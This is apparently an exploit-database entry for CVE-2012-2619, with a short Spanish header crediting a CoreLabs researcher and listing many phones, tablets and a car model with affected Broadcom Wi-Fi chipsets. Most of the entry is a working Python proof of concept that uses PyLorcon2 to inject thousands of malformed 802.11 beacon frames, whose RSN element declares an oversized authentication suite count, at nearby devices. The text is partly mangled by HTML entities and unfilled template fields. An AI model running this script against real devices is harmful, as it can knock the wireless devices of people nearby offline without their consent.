CoreLabs (Core Security Technologies) fue descubierta por el
investigador argentino Andrés Blanco,
# Vendor Homepage:
# Software Link: [download link if available]
# Version: 1.0
# Tested on:
Apple iPhone 3GS
Apple iPod 2G
HTC Touch Pro 2
HTC Droid Incredible
Samsung Spica
Acer Liquid
Motorola Devour
Vehículo Ford Edge
Dispositivos afectados con el chipset BCM4329:
Apple iPhone 4
Apple iPhone 4 Verizon
Apple iPod 3G
Apple iPad Wi-Fi
Apple iPad 3G
Apple iPad 2
Apple Tv 2G
Motorola Xoom
Motorola Droid X2
Motorola Atrix
Samsung Galaxy Tab
Samsung Galaxy S 4G
Samsung Nexus S
Samsung Stratosphere
Samsung Fascinate
HTC Nexus One
HTC Evo 4G
HTC ThunderBolt
HTC Droid Incredible 2
LG Revolution
Sony Ericsson Xperia Play
Pantech Breakout
Nokia Lumina 800
Kyocera Echo
Asus Transformer Prime
Malata ZPad"
 
# CVE : 2012-2619
#!/usr/bin/env python
 
import sys
import time
import struct
import PyLorcon2
 
def beaconFrameGenerator():
    sequence = 0
    while(1):
        sequence = sequence % 4096
 
        # Frame Control
        frame = &#039;\x80&#039; # Version: 0 - Type: Managment - Subtype: Beacon
        frame += &#039;\x00&#039; # Flags: 0
        frame += &#039;\x00\x00&#039; # Duration: 0
        frame += &#039;\xff\xff\xff\xff\xff\xff&#039; # Destination: ff:ff:ff:ff:ff:ff
        frame += &#039;\x00\x00\x00\x15\xde\xad&#039; # Source: 00:00:00:15:de:ad
        frame += &#039;\x00\x00\x00\x15\xde\xad&#039; # BSSID: 00:00:00:15:de:ad
        frame += struct.pack(&#039;H&#039;, sequence) # Fragment: 0 - Sequenence:
#part of the generator
        # Frame Body
        frame += struct.pack(&#039;Q&#039;, time.time()) # Timestamp
        frame += &#039;\x64\x00&#039; # Beacon Interval: 0.102400 seconds
        frame += &#039;\x11\x04&#039; # Capability Information: ESS, Privacy,
#Short Slot time
        # Information Elements
        # SSID: buggy
        frame += &#039;\x00\x05buggy&#039;
        # Supported Rates: 1,2,5.5,11,18,24,36,54
        frame += &#039;\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c&#039;
        # DS Parameter Set: 6
        frame += &#039;\x03\x01\x06&#039;
        # RSN IE
        frame += &#039;\x30&#039; # ID: 48
        frame += &#039;\x14&#039; # Size: 20
        frame += &#039;\x01\x00&#039; # Version: 1
        frame += &#039;\x00\x0f\xac\x04&#039; # Group cipher suite: TKIP
        frame += &#039;\x01\x00&#039; # Pairwise cipher suite count: 1
        frame += &#039;\x00\x0f\xac\x00&#039; # Pairwise cipher suite 1: TKIP
        frame += &#039;\xff\xff&#039; # Authentication suites count: 65535
        frame += &#039;\x00\x0f\xac\x02&#039; # Pairwise authentication suite 2: PSK
        frame += &#039;\x00\x00&#039;
 
        sequence += 1
        yield frame
 
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage:"
        print "\t%s <wireless interface>" % sys.argv[0]
        sys.exit(-1)
 
    iface = sys.argv[1]
    context = PyLorcon2.Context(iface)
    context.open_injmon()
 
    generator = beaconFrameGenerator()
 
    for i in range(10000):
        frame = generator.next()
        time.sleep(0.100)
        context.send_bytes(frame)

